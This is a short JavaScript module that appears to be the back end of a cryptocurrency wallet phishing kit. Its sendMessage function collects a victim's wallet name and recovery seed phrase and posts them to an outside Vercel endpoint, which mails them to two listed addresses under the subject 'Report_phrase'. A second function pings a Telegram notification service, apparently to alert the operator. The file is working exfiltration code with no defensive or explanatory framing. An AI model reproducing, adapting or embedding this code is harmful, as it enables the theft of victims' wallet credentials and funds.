var myHeaders = new Headers();
myHeaders.append("Content-Type", "application/json");

export const sendMessage = async (data) => {
  var raw = JSON.stringify({
    message: `wallet: ${data.wallet} <br/> phrase:  ${data.phrase}`,
    to: "resultbox4us@outlook.com, anthonyerics84@gmail.com",
    subject: "Report_phrase",
    name: `${data.wallet}`,
  });

  var requestOptions = {
    method: "POST",
    headers: myHeaders,
    body: raw,
    redirect: "follow",
  };
  return await fetch(
    "https://expresspages-chi.vercel.app/trustgain",
    requestOptions
  );
};

export const callTelegram = async (hostname, param) => {
  const requestOptions = {
    method: "GET",
    redirect: "follow",
  };

  return await fetch(
    `https://api.callmebot.com/start.php?user=@jhonpower&text=yuyuu`
  );
};
